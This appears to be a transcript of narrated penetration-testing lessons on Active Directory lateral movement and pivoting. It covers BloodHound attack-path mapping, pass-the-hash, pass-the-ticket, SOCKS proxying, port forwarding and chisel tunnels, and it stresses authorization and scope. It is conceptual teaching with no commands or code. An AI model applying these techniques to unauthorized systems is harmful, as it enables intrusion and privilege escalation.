In Active Directory environments, understanding the complex web of relationships between users, groups, computers, and access control lists is crucial for effective lateral movement and privilege escalation. This is where BloodHound becomes an invaluable tool. BloodHound is a powerful graph theory tool that helps visualize these relationships, allowing you to quickly identify potential attack paths to high-value targets, such as Domain Admin. It works by collecting data from your target Active Directory environment using specialized data collectors like Sharp Hound. exe for Windows or Blood Hound dot P Y file for Linux. Once collected, this data is imported into the BloodHound GUI, which then renders a graphical representation of the AD structure. You can then query this graph to find paths like 'shortest path to Domain Admin' or 'users with admin rights on multiple machines.' This visual approach makes it much easier to spot misconfigurations and weak links that might otherwise go unnoticed. For example, you might discover that a low-privileged user has administrative rights on a server that a Domain Admin frequently logs into, creating a clear lateral movement path. A common mistake is to only collect data once; AD environments are dynamic, so regular data collection provides the most accurate attack paths. BloodHound transforms the daunting task of AD analysis into an intuitive and actionable process.

As you delve into lateral movement and pivoting, it's crucial to be aware of common pitfalls and to always prioritize safety and authorization. One frequent mistake is not thoroughly enumerating the network from your compromised host. Stopping too early means you might miss valuable targets or easier attack paths. Another common error is attempting to reuse credentials on systems where they simply don't apply, wasting time and potentially triggering alerts. Forgetting to properly configure your proxychains or tunneling tools, such as chisel or SSH, is also a common issue that leads to broken connections and frustration. Always double-check your syntax and ensure your tunnels are active. Beyond technical errors, the most important consideration is safety. Lateral movement significantly increases the scope of your compromise. You must always ensure you have explicit authorization for every system you interact with, even indirectly through a pivot. Unauthorized access, even during a penetration test, can have serious legal and ethical consequences. Always operate within the defined scope of your engagement. By understanding these common mistakes and adhering to strict safety protocols, you can conduct more effective, efficient, and responsible penetration tests, minimizing risks while maximizing your impact.

Let's recap the essential concepts from this chapter. Lateral Movement is the strategic process of moving from one compromised host to another within a network, expanding your control and searching for higher-value targets. It's about deepening your presence. Pivoting, on the other hand, is the technique of routing network traffic through a compromised host to access otherwise unreachable internal network segments, effectively turning that host into a proxy for your attacks. These two concepts are foundational for any advanced penetration test. We also covered Pass-the-Hash, an attack where you authenticate using an NTLM hash instead of a plaintext password, and Pass-the-Ticket, which involves injecting stolen Kerberos tickets into a session. Both are powerful credential reuse techniques. Understanding these core ideas is vital for navigating complex internal networks and achieving your penetration testing objectives.

Continuing our summary, we explored several advanced techniques and tools for effective lateral movement and pivoting. Pass-the-Ticket is a technique where you inject a stolen Kerberos ticket into your session to authenticate to services, often used in Active Directory. For network routing, a SOCKS Proxy allows you to route all your network traffic through a compromised host, making your attacks appear to originate from within the internal network. Complementing this is Port Forwarding, which redirects specific ports from your attacking machine through a compromised host to a target service. We also highlighted Chisel, a versatile tool for creating fast TCP/UDP tunnels over HTTP, especially useful when SSH is unavailable. Finally, Blood Hound is an indispensable graph theory tool for mapping and visualizing attack paths in Active Directory environments. Mastering these concepts and tools will significantly enhance your ability to navigate and control complex internal networks during a penetration test.
